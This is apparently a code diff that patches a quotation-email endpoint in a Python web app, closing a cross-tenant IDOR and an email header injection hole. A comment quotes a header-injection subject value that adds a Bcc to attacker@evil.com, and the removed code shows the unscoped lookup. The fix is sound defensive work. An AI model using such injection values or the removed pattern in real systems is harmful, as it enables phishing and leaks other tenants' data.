@@ -4,10 +4,10 @@ from pydantic import BaseModel
 from typing import Optional
 
 from app.core.dependencies import get_db, get_current_user, CurrentUser
-from app.models.quotation import QuotSummary
 from app.models.customer import CustomerContacts
-from app.models.company import Company
+from app.services.access_service import AccessContext, get_access_context
 from app.services.email_service import email_service
+from app.api.v1.quotations import _get_quot_or_403
 
 router = APIRouter()
 
@@ -28,6 +28,7 @@ def send_quotation_email(
     data: SendQuotationEmailRequest,
     db: Session = Depends(get_db),
     current_user: CurrentUser = Depends(get_current_user),
+    ctx: AccessContext = Depends(get_access_context),
 ):
     smtp_config = email_service.get_smtp_config(db, current_user.company_id)
     if not smtp_config:
@@ -36,15 +37,16 @@ def send_quotation_email(
             detail="SMTP is not configured for this company",
         )
 
-    quotation = db.query(QuotSummary).filter(
-        QuotSummary.quotId == data.quotId,
-        QuotSummary.isActive == True,
-    ).first()
-    if not quotation:
-        raise HTTPException(status_code=404, detail="Quotation not found")
+    # Route the quotation through the full F2/F5/F6 pipeline used elsewhere in
+    # the quotation API. Was: bare `quotId == data.quotId, isActive == True`,
+    # which let any authenticated user blast another tenant's quotation
+    # through this company's SMTP server to an arbitrary contact — both an
+    # IDOR and a phishing primitive.
+    quotation = _get_quot_or_403(db, data.quotId, ctx)
 
     contact = db.query(CustomerContacts).filter(
         CustomerContacts.customerContactId == data.contactId,
+        CustomerContacts.companyId == current_user.company_id,
         CustomerContacts.isActive == True,
     ).first()
     if not contact:
@@ -54,7 +56,11 @@ def send_quotation_email(
     if not to_email:
         raise HTTPException(status_code=400, detail="Contact has no email address")
 
-    subject = data.subject or f"Quotation {quotation.quotNo}"
+    # Strip CR/LF before the subject lands in a MIME header. Without this, a
+    # subject like "x\r\nBcc: attacker@evil.com" lets a caller append headers
+    # and silently fan the email out to attacker-chosen addresses.
+    raw_subject = data.subject or f"Quotation {quotation.quotNo}"
+    subject = raw_subject.replace("\r", "").replace("\n", "")
     body = data.htmlBody or f"""
     <h2>Quotation: {quotation.quotNo}</h2>
     <p>Dear {contact.contactPersonName or 'Customer'},</p>
